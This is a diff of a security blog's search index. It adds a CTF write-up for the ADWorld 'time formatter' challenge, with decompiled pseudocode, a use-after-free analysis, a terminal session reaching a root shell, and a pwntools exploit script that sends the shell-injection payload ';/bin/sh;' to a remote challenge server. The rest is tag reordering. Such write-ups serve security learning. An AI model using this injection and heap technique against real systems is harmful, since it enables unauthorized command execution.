@@ -1,9 +1,59 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>ADWorld PWN Challenge Area Write-up (pwn100)</title>
+    <url>/2020/08/06/ADWorld-PWN-Challenge-Area-Write-up-pwn100/</url>
+    <content><![CDATA[<h2 id="pwn100"><a href="#pwn100" class="headerlink" title="pwn100"></a>pwn100</h2><h2 id="Information"><a href="#Information" class="headerlink" title="Information"></a>Information</h2><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2>]]></content>
+      <categories>
+        <category>Pwn</category>
+      </categories>
+      <tags>
+        <tag>linux</tag>
+        <tag>pwn</tag>
+        <tag>stack overflow</tag>
+        <tag>buffer overflow</tag>
+        <tag>rop</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>ADWorld PWN Challenge Area Write-up (time formatter)</title>
-    <url>/2020/08/05/ADWorld-PWN-Challenge-Area-Write-up-time-formatter/</url>
-    <content><![CDATA[]]></content>
+    <url>/2020/08/05/2020-08-05-ADWorld-PWN-Challenge-Area-Write-up-time-formatter/</url>
+    <content><![CDATA[<p>This task is about <code>UAF</code> (Use After Free).</p>
+<h2 id="time-formatter"><a href="#time-formatter" class="headerlink" title="time formatter"></a>time formatter</h2><p>Attachment: <a href="/filehost/apcaw/time_formatter">time_formatter</a><br>Description: It is difficult to convert UNIX time to date, so Mary wrote a tool to accomplish this task.</p>
+<h2 id="Information"><a href="#Information" class="headerlink" title="Information"></a>Information</h2><p>Check:<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ file time_formatter</span><br><span class="line">time_formatter: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=5afd38988c61546c0035e236ce938af6181e85a6, stripped</span><br><span class="line">$ checksec time_formatter</span><br><span class="line">[*] &apos;/root/time_formatter&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">    FORTIFY:  Enabled</span><br></pre></td></tr></table></figure></p>
+<p>Pseudocode:<br><code>main</code>:<br><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">__gid_t</span> v3; <span class="comment">// eax</span></span><br><span class="line">  FILE *v4; <span class="comment">// rdi</span></span><br><span class="line">  __int64 v5; <span class="comment">// rdx</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  v3 = getegid();</span><br><span class="line">  setresgid(v3, v3, v3);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0L</span>L);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Welcome to Mary's Unix Time Formatter!"</span>);</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"1) Set a time format."</span>);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"2) Set a time."</span>);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"3) Set a time zone."</span>);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"4) Print your time."</span>);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"5) Exit."</span>);</span><br><span class="line">      __printf_chk(<span class="number">1L</span>L, <span class="string">"&gt; "</span>);</span><br><span class="line">      v4 = <span class="built_in">stdout</span>;</span><br><span class="line">      fflush(<span class="built_in">stdout</span>);</span><br><span class="line">      <span class="keyword">switch</span> ( sub_400D26() )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">          v6 = sub_400E00();</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">          v6 = sub_400E63();</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">          v6 = sub_400E43();</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">          v6 = sub_400EA3((__int64)v4, (__int64)<span class="string">"&gt; "</span>, v5);</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">          v6 = sub_400F8F();</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">          <span class="keyword">continue</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( !v6 );</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p><code>sub_400EA3</code> – “4) Print your time.” :<br><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">sub_400EA3</span><span class="params">(__int64 a1, __int64 a2, __int64 a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// r8</span></span><br><span class="line">  <span class="keyword">char</span> command; <span class="comment">// [rsp+8h] [rbp-810h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v6; <span class="comment">// [rsp+808h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( ptr )</span><br><span class="line">  &#123;</span><br><span class="line">    __snprintf_chk(</span><br><span class="line">      (__int64)&amp;command,</span><br><span class="line">      <span class="number">2048L</span>L,</span><br><span class="line">      <span class="number">1L</span>L,</span><br><span class="line">      <span class="number">2048L</span>L,</span><br><span class="line">      (__int64)<span class="string">"/bin/date -d @%d +'%s'"</span>,</span><br><span class="line">      (<span class="keyword">unsigned</span> <span class="keyword">int</span>)dword_602120,</span><br><span class="line">      (__int64)ptr,</span><br><span class="line">      a3);</span><br><span class="line">    __printf_chk(<span class="number">1L</span>L, <span class="string">"Your formatted time is: "</span>);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    <span class="keyword">if</span> ( getenv(<span class="string">"DEBUG"</span>) )</span><br><span class="line">      __fprintf_chk(<span class="built_in">stderr</span>, <span class="number">1L</span>L, <span class="string">"Running command: %s\n"</span>, &amp;command, v3);</span><br><span class="line">    setenv(<span class="string">"TZ"</span>, value, <span class="number">1</span>);</span><br><span class="line">    system(&amp;command);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"You haven't specified a format!"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p><code>sub_400F8F</code> – 5) Exit. :<br><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">signed</span> __<span class="function">int64 <span class="title">sub_400F8F</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [rsp+8h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+18h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  sub_400C7E(ptr);</span><br><span class="line">  sub_400C7E(value);</span><br><span class="line">  __printf_chk(<span class="number">1L</span>L, <span class="string">"Are you sure you want to exit (y/N)? "</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  fgets(&amp;s, <span class="number">16</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  result = <span class="number">0L</span>L;</span><br><span class="line">  <span class="keyword">if</span> ( (s &amp; <span class="number">0xDF</span>) == <span class="number">89</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"OK, exiting."</span>);</span><br><span class="line">    result = <span class="number">1L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>Other subfunctions like: “1) Set a time format.”, “2) Set a time.” and “3) Set a time zone.” please check it by yourselves in IDA.</p>
+<h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><p>To sum up, sub function:</p>
+<ol>
+<li>Do <code>malloc()</code> (in <code>strdup()</code>) for input and assign it to <code>ptr</code>, special characters are limited.</li>
+<li>Receive input and save it to <code>dword_602120</code>.</li>
+<li>Do <code>malloc()</code> for input and assign it to <code>value</code>, without character limit.</li>
+<li>If <code>ptr</code> is not null, call <code>system()</code> to execute commands (consists of <code>dword_602120</code> and <code>ptr</code>)</li>
+<li>first free <code>ptr</code>, then free <code>value</code>, then ask if you exit.</li>
+</ol>
+<p>In subfunction 4 the command is like <code>&quot;/bin/date -d @%d +&#39;%s&#39;&quot;</code>, the <code>ptr</code> will replace <code>%s</code>, so we can input <code>&#39;;/bin/sh;&#39;</code> to do command injection, but the question is <code>&#39;</code> is filtered in subfunction 1.</p>
+<p>In subfunction 3 our input to <code>value</code> will not be restricted. In subfunction 5 it just frees pointers but not exit or sets them null. </p>
+<p>We can exploit <code>UAF</code> to input payload to <code>value</code> and call <code>system()</code> to execute it as <code>ptr</code>: </p>
+<ul>
+<li>First malloc a <code>ptr</code> in subfunc 1</li>
+<li>Second free it in subfunc 5 (first free <code>ptr</code> then free <code>value</code>)</li>
+<li>Then malloc a <code>value</code> in subfunc 3 (using former <code>ptr</code> trunk)</li>
+<li>Finally execute system commands in subfunc 4<h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2>We can achieve it in terminal:<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ ./time_formatter</span><br><span class="line">Welcome to Marys Unix Time Formatter!</span><br><span class="line">1) Set a time format.</span><br><span class="line">2) Set a time.</span><br><span class="line">3) Set a time zone.</span><br><span class="line">4) Print your time.</span><br><span class="line">5) Exit.</span><br><span class="line">&gt; 1                         &lt;-- first malloc</span><br><span class="line">Format:</span><br><span class="line">Format set.</span><br><span class="line">1) Set a time format.</span><br><span class="line">2) Set a time.</span><br><span class="line">3) Set a time zone.</span><br><span class="line">4) Print your time.</span><br><span class="line">5) Exit.</span><br><span class="line">&gt; 5                         &lt;-- free</span><br><span class="line">Are you sure you want to exit (y/N)?</span><br><span class="line">1) Set a time format.</span><br><span class="line">2) Set a time.</span><br><span class="line">3) Set a time zone.</span><br><span class="line">4) Print your time.</span><br><span class="line">5) Exit.</span><br><span class="line">&gt; 3                         &lt;-- second malloc</span><br><span class="line">Time zone: &apos;;/bin/sh;&apos;</span><br><span class="line">Time zone set.</span><br><span class="line">1) Set a time format.</span><br><span class="line">2) Set a time.</span><br><span class="line">3) Set a time zone.</span><br><span class="line">4) Print your time.</span><br><span class="line">5) Exit.</span><br><span class="line">&gt; 4                         &lt;-- execute command</span><br><span class="line">Your formatted time is:</span><br><span class="line"># id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line">#</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<p>Or write script (use new method – <code>sendlineafter</code>):<br><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = process(<span class="string">'./time_formatter'</span>)</span><br><span class="line">sh = remote(<span class="string">'220.249.52.133'</span>, <span class="number">47869</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">'&gt;'</span>,<span class="string">'1'</span>)</span><br><span class="line">sh.sendline(<span class="string">''</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">'&gt;'</span>,<span class="string">'5'</span>)</span><br><span class="line">sh.sendline(<span class="string">''</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">'&gt;'</span>,<span class="string">'3'</span>)</span><br><span class="line">sh.sendline(<span class="string">"';/bin/sh;'"</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">'&gt;'</span>,<span class="string">'4'</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure></p>
+]]></content>
+      <categories>
+        <category>Pwn</category>
+      </categories>
+      <tags>
+        <tag>linux</tag>
+        <tag>pwn</tag>
+        <tag>uaf</tag>
+        <tag>heap</tag>
+      </tags>
   </entry>
   <entry>
     <title>ADWorld PWN Challenge Area Write-up (welpwn)</title>
@@ -30,8 +80,8 @@
       <tags>
         <tag>linux</tag>
         <tag>pwn</tag>
-        <tag>buffer overflow</tag>
         <tag>stack overflow</tag>
+        <tag>buffer overflow</tag>
         <tag>rop</tag>
       </tags>
   </entry>
@@ -59,8 +109,8 @@
       <tags>
         <tag>linux</tag>
         <tag>pwn</tag>
-        <tag>buffer overflow</tag>
         <tag>stack overflow</tag>
+        <tag>buffer overflow</tag>
         <tag>rop</tag>
       </tags>
   </entry>
@@ -92,8 +142,8 @@ int (*v3)(); // [esp+30h] [ebp-54h]
       <tags>
         <tag>linux</tag>
         <tag>pwn</tag>
-        <tag>buffer overflow</tag>
         <tag>stack overflow</tag>
+        <tag>buffer overflow</tag>
       </tags>
   </entry>
   <entry>
@@ -319,11 +369,11 @@ unsigned int seed[2]; // [rsp+30h] [rbp-10h]
       <tags>
         <tag>linux</tag>
         <tag>pwn</tag>
-        <tag>buffer overflow</tag>
         <tag>stack overflow</tag>
+        <tag>buffer overflow</tag>
+        <tag>format string</tag>
         <tag>write-ups</tag>
         <tag>ctf</tag>
-        <tag>format string</tag>
       </tags>
   </entry>
   <entry>
@@ -1136,9 +1186,9 @@ unsigned int seed[2]; // [rsp+30h] [rbp-10h]
         <category>Note</category>
       </categories>
       <tags>
-        <tag>linux</tag>
         <tag>note</tag>
         <tag>docker</tag>
+        <tag>linux</tag>
         <tag>pip</tag>
         <tag>gem</tag>
       </tags>
@@ -1811,8 +1861,8 @@ lcx_listen -- like lcx -listen
         <category>Note</category>
       </categories>
       <tags>
-        <tag>linux</tag>
         <tag>note</tag>
+        <tag>linux</tag>
         <tag>wine</tag>
       </tags>
   </entry>
@@ -2949,8 +2999,8 @@ quit/exit
         <category>Linux</category>
       </categories>
       <tags>
-        <tag>linux</tag>
         <tag>note</tag>
+        <tag>linux</tag>
         <tag>kali</tag>
       </tags>
   </entry>
@@ -3130,11 +3180,11 @@ quit/exit
         <category>Note</category>
       </categories>
       <tags>
-        <tag>linux</tag>
         <tag>note</tag>
+        <tag>docker</tag>
+        <tag>linux</tag>
         <tag>wsl</tag>
         <tag>hyper-v</tag>
-        <tag>docker</tag>
         <tag>windows</tag>
       </tags>
   </entry>
@@ -3352,8 +3402,8 @@ $ hexo s -g
       </categories>
       <tags>
         <tag>note</tag>
-        <tag>docker</tag>
         <tag>hexo</tag>
+        <tag>docker</tag>
         <tag>mysql</tag>
       </tags>
   </entry>
